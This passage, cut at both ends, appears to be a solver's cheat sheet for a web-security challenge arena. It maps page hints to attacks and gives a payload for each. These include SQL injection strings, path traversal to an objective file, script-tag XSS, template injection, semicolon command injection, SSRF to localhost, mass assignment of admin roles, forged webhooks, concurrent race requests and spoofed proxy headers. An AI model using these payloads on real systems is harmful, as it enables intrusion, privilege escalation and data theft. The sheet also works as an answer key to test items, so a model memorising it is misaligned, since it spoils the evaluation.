ign id from /api/history\nsearch box, \"database\" | feature_route only, \"a sign\"  -> SQLi | open route  -> q=zz') OR 1=1 -- (+ quote-balanced ' \" )) #) | GET it\n?doc= (handbook.php/notes.php), \"stay inside\"          -> traversal          -> ../ x10 + /run/huntress/objective.txt\ncallback_nonce, \"repeats everything\"                   -> reflected XSS      -> ?q=<script>fetch('/cb?nonce=N')</script>, then GET /cb?nonce=N\n      with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template          -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\"                     -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, hidden csrf_token, \"even strangers\" -> CSRF (D09)         -> external option, Sec-Fetch-Site: cross-site, Mode: navigate,\n                                                                                Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route, \"standards. Low ones\"       -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\"} -> GET path\n\"evaluates everything\", empty \"Rendered message\" <pre> -> SSTI (D11)         -> ?template=a${7*7}b{{7*7}}c per param -> {{objective}}\n\"plant ... come back later\", post_required + rows:[]   -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"}, GET secondary\n\"binds whatever you hand it\", administrator_required   -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin, roles,..}\ninventory_route + protected_reference                  -> field/action authz -> feature?id=<protected>&fields=<f>&action=<a>, EVERY single f x a\nabsolute_url_required + secondary internal_only        -> SSRF (D15)         -> feature?url=http://127.0.0.1:8080<secondary>; ladder :80 :5000 ..\ninput_parameter + example_path, 400 path_required      -> cmd injection(D16) -> feature?<param>=<example>%3Bcat%20/run/huntress/objective.txt\nrecovery_guide_route, self_service_only                -> reset token (D17)  -> token for the self_service id, redeem it with the other account_id\nprotected_reference + note, GET 404 not_found          -> GraphQL (D18)      -> POST {\"query\":\"{__schema{..}}\"}; case(id:\"<prot>\"){id title note}\nevent_type + owner_scope (values), webhook_rejected    -> forged webhook(D19)-> POST JSON {event_type,type,event: <ev>, owner_scope,scope,owner: <scope>,\n                                                                                role,current_role:\"admin\", source,sender:\"provider\", verified,signed,trusted:true}\nstate_format_route, \"sign nothing\", state_required     -> unsigned state(D20)-> GET guide; POST {<field>: b64url(sample, role=\"administrator\")} to `transport`\n\"One credit, two purchases ... race it\", secondary 403 -> race (D21)         -> NO sequential POST; 24 concurrent POST {} to feature on a barrier,\n  credit_not_overspent + credits, 409 credit_unavailable                        then GET secondary (UNSOLVED: success shape unknown)\nstream_reference, 426 websocket_upgrade_required,      -> WS stream (D22)    -> WS handshake to feature?stream=<ref> WITH Origin: <target> (none = 403);\n  \"upgraded to websockets ... never meant for you\"                              proof in the first server text frame (stdlib socket+ssl client)\ndeployment: trusted_reverse_proxy, 403 loopback_only   -> proxy header (D23) -> GET feature with X-Forwarded-For: 127.0.0.1 (then X-Real-IP, Forwarded:\n  + evaluated_client, \"whatever the proxy whispers\"                             for=, X-Client-IP, True-Client-IP); evaluated_client must flip\ncurrent_role / role cookie / X-*-Role